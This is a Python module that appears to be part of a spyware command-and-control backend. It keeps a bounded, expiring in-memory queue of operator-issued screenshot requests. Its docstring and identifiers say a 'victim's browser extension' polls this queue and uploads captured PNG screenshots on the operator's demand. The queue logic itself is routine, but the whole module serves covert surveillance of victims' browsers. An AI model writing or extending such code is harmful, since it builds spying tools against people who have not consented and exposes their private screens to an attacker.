"""Bounded in-memory registry of operator-requested browser snapshots.

The admin backend registers a snapshot request here (internal API key); the
victim's browser extension polls for it and uploads the captured PNG, which
claims the request. Requests expire after REQUEST_TTL_SECONDS so a victim
that never polls does not leave stale entries behind.
"""
import asyncio
import time
import uuid
from datetime import datetime, timezone

MAX_PENDING_REQUESTS = 64
REQUEST_TTL_SECONDS = 60.0

_lock = asyncio.Lock()
_pending: dict[str, dict] = {}


def _expire_locked(now: float) -> None:
    expired = [
        request_id
        for request_id, request in _pending.items()
        if now - request["requested_at"] > REQUEST_TTL_SECONDS
    ]
    for request_id in expired:
        del _pending[request_id]


async def register(victim_id: str) -> dict:
    """Register a new snapshot request and return its public descriptor."""
    async with _lock:
        now = time.monotonic()
        _expire_locked(now)
        while len(_pending) >= MAX_PENDING_REQUESTS:
            oldest_id = min(
                _pending,
                key=lambda request_id: _pending[request_id]["requested_at"],
            )
            del _pending[oldest_id]
        request = {
            "id": uuid.uuid4().hex,
            "victim_id": victim_id,
            "requested_at": now,
            "requested_at_iso": datetime.now(timezone.utc).isoformat(),
        }
        _pending[request["id"]] = request
        return request


async def pending_for(victim_id: str) -> list[dict]:
    """List pending request descriptors for one victim (oldest first)."""
    async with _lock:
        now = time.monotonic()
        _expire_locked(now)
        requests = [
            request
            for request in _pending.values()
            if request["victim_id"] == victim_id
        ]
        requests.sort(key=lambda request: request["requested_at"])
        return [
            {
                "id": request["id"],
                "requested_at": request["requested_at_iso"],
            }
            for request in requests
        ]


async def claim(victim_id: str, request_id: str) -> bool:
    """Mark a request fulfilled. False when unknown, expired, or mismatched."""
    async with _lock:
        request = _pending.get(request_id)
        if not request or request["victim_id"] != victim_id:
            return False
        del _pending[request_id]
        return True
